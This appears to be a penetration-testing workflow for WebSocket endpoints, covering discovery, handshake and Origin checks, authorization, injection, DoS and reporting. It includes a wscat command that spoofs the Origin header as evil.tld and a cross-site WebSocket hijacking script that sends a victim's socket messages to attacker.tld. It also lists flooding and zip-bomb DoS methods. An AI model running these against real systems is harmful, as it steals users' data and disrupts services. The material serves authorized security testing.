# WebSocket Testing Workflow

## 0 — Discover

Paths often co-located with REST API:
`/ws`, `/wss`, `/socket.io/`, `/graphql` (subscriptions), `/api/ws`, `/live`,
`/notifications`, `/stream`, `/events`.

Inspect browser DevTools -> Network -> WS, or grep JS bundles for
`new WebSocket(` and `io(` (socket.io).

## 1 — Handshake checks

- Does server accept connections with missing/invalid `Origin`? (CSWSH)
- Does server accept connections without auth? (tokens in Sec-WebSocket-Protocol,
  cookies, or Authorization header?)
- Downgrade: does `ws://` work where `wss://` should be enforced?

```bash
# Bypass Origin using wscat
wscat -c wss://target.tld/ws -H 'Origin: https://evil.tld'
```

## 2 — CSWSH (Cross-Site WebSocket Hijacking)

If auth is purely cookie-based and Origin is unchecked, an attacker page can
open the socket as the victim. Reproduce:

```html
<script>
  const ws = new WebSocket('wss://target.tld/ws');
  ws.onmessage = e => fetch('https://attacker.tld/x?d=' + btoa(e.data));
  ws.onopen = () => ws.send(JSON.stringify({action:'subscribe',channel:'me'}));
</script>
```

## 3 — Message-layer authorization

For every message type the client sends, test:
- Subscribing to channels belonging to other users / tenants (BOLA).
- Sending privileged action verbs as a low-priv user (BFLA).
- Replaying messages captured from another session.

## 4 — Injection in messages

Payloads from `payloads/injection.txt` apply:
- SQLi / NoSQLi in message fields
- Stored XSS if messages are echoed to other users' DOM
- Command injection if a field is used server-side for shell/IPC

## 5 — DoS

- Flood small messages (rate-limit check)
- Single huge frame (often uncapped)
- Many concurrent connections (connection-limit check)
- Compressed `permessage-deflate` zip-bomb

## 6 — Reporting

`schemas/finding.json` with `api_type: "websocket"`, `endpoint` = WS URL,
`http_method: "N/A"`, and `evidence.request` containing the frame(s) sent.
